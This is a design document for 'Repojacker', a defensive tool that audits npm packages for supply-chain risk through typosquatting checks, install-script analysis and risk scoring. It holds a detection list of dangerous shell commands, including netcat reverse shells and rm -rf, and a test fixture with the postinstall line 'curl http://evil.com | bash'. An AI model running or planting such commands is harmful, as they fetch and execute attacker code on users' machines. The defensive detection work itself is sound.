# Repojacker - Technical Design Document

## 1. Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                         Docker Compose                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌──────────────────┐         ┌──────────────────────────────────┐  │
│  │                  │         │                                  │  │
│  │  React Frontend  │◄───────►│  FastAPI Backend                 │  │
│  │  (nginx:3000)    │  REST   │  (uvicorn:8000)                  │  │
│  │                  │         │                                  │  │
│  └──────────────────┘         └──────────────┬───────────────────┘  │
│                                              │                       │
└──────────────────────────────────────────────┼───────────────────────┘
                                               │
                    ┌──────────────────────────┼──────────────────────────┐
                    │                          │                          │
                    ▼                          ▼                          ▼
           ┌───────────────┐         ┌─────────────────┐        ┌─────────────────┐
           │ npm Registry  │         │   GitHub API    │        │ GitHub Advisory │
           │    API        │         │                 │        │    Database     │
           └───────────────┘         └─────────────────┘        └─────────────────┘
```

## 2. Component Design

### 2.1 Backend Service (FastAPI)

**Technology Stack:**
- Python 3.12
- FastAPI (async web framework)
- httpx (async HTTP client)
- Pydantic (data validation)
- uvicorn (ASGI server)

**Directory Structure:**
```
backend/
├── main.py              # FastAPI app entry point
├── routers/
│   └── audit.py         # Audit endpoint handlers
├── services/
│   ├── npm_client.py    # npm registry API client
│   ├── github_client.py # GitHub API client
│   ├── analyzer.py      # Risk analysis logic
│   └── scoring.py       # Risk score calculation
├── models/
│   ├── request.py       # Request models
│   └── response.py      # Response models
├── utils/
│   ├── typosquat.py     # Typosquatting detection
│   └── patterns.py      # Suspicious pattern matching
├── requirements.txt
└── Dockerfile
```

### 2.2 Frontend Application (React)

**Technology Stack:**
- React 18
- Vite (build tool)
- TailwindCSS (styling)
- Recharts (radar chart visualization)
- Lucide React (icons)

**Directory Structure:**
```
frontend/
├── src/
│   ├── App.jsx              # Main application
│   ├── components/
│   │   ├── SearchBar.jsx    # Package input
│   │   ├── RiskScore.jsx    # Score display
│   │   ├── RiskRadar.jsx    # Radar chart
│   │   ├── FindingsList.jsx # Findings table
│   │   ├── MetadataCard.jsx # Package info
│   │   └── Loading.jsx      # Loading state
│   ├── hooks/
│   │   └── useAudit.js      # Audit API hook
│   ├── utils/
│   │   └── severity.js      # Severity helpers
│   ├── index.css            # Global styles
│   └── main.jsx             # Entry point
├── public/
│   └── favicon.svg
├── index.html
├── package.json
├── vite.config.js
├── tailwind.config.js
└── Dockerfile
```

## 3. API Design

### 3.1 Endpoints

#### POST /api/audit
Perform security audit on a package.

**Request:**
```json
{
  "package_name": "lodash"
}
```

**Response:**
```json
{
  "package_name": "lodash",
  "version": "4.17.21",
  "risk_score": 15,
  "risk_level": "low",
  "factors": [
    {
      "name": "Single Maintainer",
      "severity": "low",
      "description": "Package has only one maintainer",
      "details": "Single point of failure: jdalton",
      "category": "maintenance"
    }
  ],
  "metadata": {
    "description": "Lodash modular utilities",
    "author": "John-David Dalton",
    "license": "MIT",
    "repository": "https://github.com/lodash/lodash",
    "created": "2012-04-23T00:00:00.000Z",
    "modified": "2021-02-20T00:00:00.000Z",
    "maintainers": ["jdalton"],
    "downloads_weekly": 45000000,
    "versions_count": 114
  },
  "radar_scores": {
    "authenticity": 95,
    "maintenance": 70,
    "security": 90,
    "reputation": 98
  },
  "repository_verification": {
    "exists": true,
    "verified": true,
    "stars": 58000,
    "forks": 7000
  },
  "timestamp": "2024-12-10T15:30:00Z",
  "audit_duration_ms": 1250
}
```

#### GET /api/health
Health check endpoint.

**Response:**
```json
{
  "status": "healthy",
  "version": "1.0.0",
  "timestamp": "2024-12-10T15:30:00Z"
}
```

### 3.2 Error Responses

```json
{
  "error": "package_not_found",
  "message": "Package 'nonexistent-pkg' not found on npm",
  "status_code": 404
}
```

## 4. Data Models

### 4.1 Risk Factor

```python
class RiskFactor(BaseModel):
    name: str                    # e.g., "Typosquatting Detected"
    severity: Severity           # critical, high, medium, low, info
    description: str             # Human-readable explanation
    details: Optional[str]       # Specific evidence
    category: Category           # authenticity, maintenance, security, reputation
```

### 4.2 Severity Enum

```python
class Severity(str, Enum):
    CRITICAL = "critical"  # Immediate action required
    HIGH = "high"          # Significant risk
    MEDIUM = "medium"      # Notable concern
    LOW = "low"            # Minor issue
    INFO = "info"          # Informational only
```

### 4.3 Category Enum

```python
class Category(str, Enum):
    AUTHENTICITY = "authenticity"   # Is this the real package?
    MAINTENANCE = "maintenance"     # Is it well-maintained?
    SECURITY = "security"           # Are there vulnerabilities?
    REPUTATION = "reputation"       # Is it widely trusted?
```

## 5. Risk Scoring Algorithm

### 5.1 Severity Weights

| Severity | Points Added | Max Per Finding |
|----------|-------------|-----------------|
| Critical | 25 | 25 |
| High | 15 | 15 |
| Medium | 8 | 8 |
| Low | 3 | 3 |
| Info | 0 | 0 |

### 5.2 Score Calculation

```python
def calculate_risk_score(factors: list[RiskFactor]) -> int:
    """
    Calculate overall risk score from findings.
    Score is 0-100, capped at 100.
    """
    severity_points = {
        "critical": 25,
        "high": 15,
        "medium": 8,
        "low": 3,
        "info": 0
    }
    
    total = sum(severity_points[f.severity] for f in factors)
    return min(100, total)
```

### 5.3 Risk Level Thresholds

```python
def get_risk_level(score: int) -> str:
    if score >= 76:
        return "critical"
    elif score >= 51:
        return "high"
    elif score >= 26:
        return "medium"
    else:
        return "low"
```

### 5.4 Radar Score Calculation

Each category (authenticity, maintenance, security, reputation) gets a 0-100 score:
- Start at 100
- Subtract based on findings in that category
- Floor at 0

```python
def calculate_radar_scores(factors: list[RiskFactor]) -> dict:
    scores = {
        "authenticity": 100,
        "maintenance": 100,
        "security": 100,
        "reputation": 100
    }
    
    deductions = {
        "critical": 40,
        "high": 25,
        "medium": 15,
        "low": 5,
        "info": 0
    }
    
    for factor in factors:
        category = factor.category
        scores[category] = max(0, scores[category] - deductions[factor.severity])
    
    return scores
```

## 6. Analysis Modules

### 6.1 Typosquatting Detection

**Algorithm:**
1. Normalize package name (lowercase, remove scope)
2. Compare against list of 100+ popular packages
3. Use Levenshtein distance / SequenceMatcher
4. Flag if similarity > 0.8 and not exact match

**Popular Package List Sources:**
- npm most downloaded packages
- Known typosquatting targets
- Commonly attacked packages

### 6.2 Install Script Analysis

**Dangerous Patterns:**
```python
DANGEROUS_COMMANDS = [
    "curl", "wget",           # Network downloads
    "nc ", "netcat",          # Reverse shells
    "bash -c", "/bin/sh",     # Shell execution
    "eval(", "eval ",         # Code evaluation
    "base64",                 # Encoded payloads
    "powershell", "cmd.exe",  # Windows shells
    "rm -rf", "del /f",       # Destructive commands
    "> /dev/", "| /dev/",     # Device redirection
]

DANGEROUS_SCRIPTS = [
    "preinstall",
    "postinstall",
    "preuninstall",
    "postuninstall",
]
```

### 6.3 Repository Verification

**Checks:**
1. Repository URL exists in package.json
2. URL points to valid GitHub repo
3. Repo is not archived
4. Repo has recent activity
5. Package name matches repo name (fuzzy)

### 6.4 Maintainer Analysis

**Risk Indicators:**
- No maintainers listed → Critical
- Single maintainer → Low (bus factor)
- Recent maintainer changes → Medium
- New maintainer on old package → High

### 6.5 Age Analysis

**Thresholds:**
- < 7 days: Critical (very new)
- < 30 days: High (new)
- < 90 days: Medium (recent)
- < 365 days: Low (established)
- > 365 days: Info (mature)

### 6.6 Download Velocity

**Analysis:**
```python
def analyze_downloads(weekly_downloads: int, age_days: int) -> RiskFactor:
    if age_days < 30 and weekly_downloads > 100000:
        return RiskFactor(
            name="Suspicious Download Spike",
            severity="high",
            description="New package with unusually high downloads",
            category="reputation"
        )
    
    if age_days > 365 and weekly_downloads < 100:
        return RiskFactor(
            name="Low Adoption",
            severity="info",
            description="Mature package with minimal usage",
            category="reputation"
        )
```

## 7. Frontend Design

### 7.1 Visual Theme: "Terminal Security"

**Aesthetic Direction:**
- Dark background (#0a0a0f)
- Monospace fonts (JetBrains Mono, Fira Code)
- Neon accent colors for severity
- Scanline/CRT subtle effects
- Glowing borders on interactive elements
- ASCII-art inspired decorations

**Color Palette:**
```css
:root {
  --bg-primary: #0a0a0f;
  --bg-secondary: #12121a;
  --bg-card: #1a1a24;
  --text-primary: #e0e0e0;
  --text-secondary: #888;
  --accent-cyan: #00fff2;
  --severity-critical: #ff0040;
  --severity-high: #ff6b00;
  --severity-medium: #ffd000;
  --severity-low: #00ff88;
  --severity-info: #00b4ff;
}
```

### 7.2 Component Layout

```
┌─────────────────────────────────────────────────────────────────┐
│  ░░ CHAINGUARD ░░                              [npm] [pypi]     │
│  Supply Chain Security Auditor                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  🔍  Enter package name...                      [AUDIT]   │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────────────┐  ┌─────────────────────────────────┐  │
│  │                     │  │                                 │  │
│  │    RISK SCORE       │  │    RISK RADAR                   │  │
│  │                     │  │                                 │  │
│  │       ██ 23 ██      │  │      Authenticity               │  │
│  │        LOW          │  │           ╱╲                    │  │
│  │                     │  │    Rep   ╱  ╲  Maint            │  │
│  │  ░░░░░░░░░░░░░░░░░  │  │          ╲  ╱                   │  │
│  │                     │  │           ╲╱                    │  │
│  └─────────────────────┘  │       Security                  │  │
│                           └─────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  FINDINGS                                                 │  │
│  ├───────────────────────────────────────────────────────────┤  │
│  │  🟢 LOW    Single Maintainer                              │  │
│  │            Package has only one maintainer                │  │
│  ├───────────────────────────────────────────────────────────┤  │
│  │  ℹ️ INFO   Mature Package                                  │  │
│  │            Package is over 10 years old                   │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  PACKAGE METADATA                                         │  │
│  │  ─────────────────                                        │  │
│  │  Name: lodash                 License: MIT                │  │
│  │  Version: 4.17.21             Downloads: 45M/week         │  │
│  │  Author: John-David Dalton    Created: 2012-04-23         │  │
│  │  Repository: github.com/lodash/lodash ✓ Verified          │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.3 Animations

- Search bar: Glowing border pulse on focus
- Risk score: Count-up animation on load
- Radar chart: Draw animation on load
- Findings: Staggered fade-in
- Severity badges: Subtle pulse for critical/high

## 8. Docker Configuration

### 8.1 docker-compose.yml

```yaml
version: '3.8'

services:
  backend:
    build: ./backend
    ports:
      - "8000:8000"
    environment:
      - GITHUB_TOKEN=${GITHUB_TOKEN:-}
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/api/health"]
      interval: 30s
      timeout: 10s
      retries: 3

  frontend:
    build: ./frontend
    ports:
      - "3000:80"
    depends_on:
      - backend
```

### 8.2 Backend Dockerfile

```dockerfile
FROM python:3.12-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 8000

CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

### 8.3 Frontend Dockerfile

```dockerfile
FROM node:20-alpine AS builder

WORKDIR /app

COPY package*.json ./
RUN npm ci

COPY . .
RUN npm run build

FROM nginx:alpine

COPY --from=builder /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf

EXPOSE 80

CMD ["nginx", "-g", "daemon off;"]
```

## 9. Testing Strategy

### 9.1 Backend Tests

```python
# Test typosquatting detection
def test_typosquat_lodash():
    result = check_typosquatting("lodahs")
    assert "lodash" in [r[0] for r in result]

# Test known-bad package detection
def test_install_script_detection():
    pkg = {"scripts": {"postinstall": "curl http://evil.com | bash"}}
    factors = analyze_scripts(pkg)
    assert any(f.severity == "critical" for f in factors)

# Test score calculation
def test_risk_score_bounds():
    factors = [RiskFactor(severity="critical") for _ in range(10)]
    score = calculate_risk_score(factors)
    assert score == 100  # Capped at 100
```

### 9.2 Integration Tests

```bash
# Test known packages
curl -X POST http://localhost:8000/api/audit \
  -H "Content-Type: application/json" \
  -d '{"package_name": "lodash"}'

# Verify response structure
# Verify reasonable risk score for known-good package
```

## 10. Future Enhancements (v2+)

1. **Multi-ecosystem support:** PyPI, Maven, RubyGems, Go modules
2. **Dependency tree scanning:** Recursive analysis of transitive deps
3. **CI/CD integration:** GitHub Action, GitLab CI component
4. **API authentication:** Rate limit increases with GitHub token
5. **Historical tracking:** Compare risk over time
6. **SBOM generation:** CycloneDX/SPDX output
7. **Webhook notifications:** Alert on risk threshold breach
8. **Browser extension:** Inline warnings on npmjs.com
